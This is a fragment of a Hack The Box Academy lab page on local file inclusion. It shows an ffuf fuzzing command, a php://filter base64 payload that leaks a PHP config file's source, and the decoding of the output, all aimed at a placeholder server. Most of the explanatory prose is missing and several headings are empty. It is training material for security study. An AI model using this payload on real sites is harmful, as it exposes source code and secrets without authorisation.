<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/23/section/1492
// Platform Version: V1
// Module ID: 23
// Module Name: File Inclusion
// Module Difficulty: Medium
// Section ID: 1492
// Section Title: PHP Filters
// Page Title: Hack The Box - Academy
// Page Number: 4
-->

# PHP Filters

**Module Name:** File Inclusion **Page Number:** 4

#### 

#### FILE INCLUSION

# PHP Filters

## Input Filters

## Fuzzing for PHP Files

``` shell-session
[!bash!]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

## Standard PHP Inclusion

![https://academy.hackthebox.com/storage/modules/23/lfi_config_failed.png](https://academy.hackthebox.com/storage/modules/23/lfi_config_failed.png)

## Source Code Disclosure

``` url
php://filter/read=convert.base64-encode/resource=config
```

![https://academy.hackthebox.com/storage/modules/23/lfi_config_wrapper.png](https://academy.hackthebox.com/storage/modules/23/lfi_config_wrapper.png)

``` shell-session
[!bash!]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```

# 

# 

#### Questions

####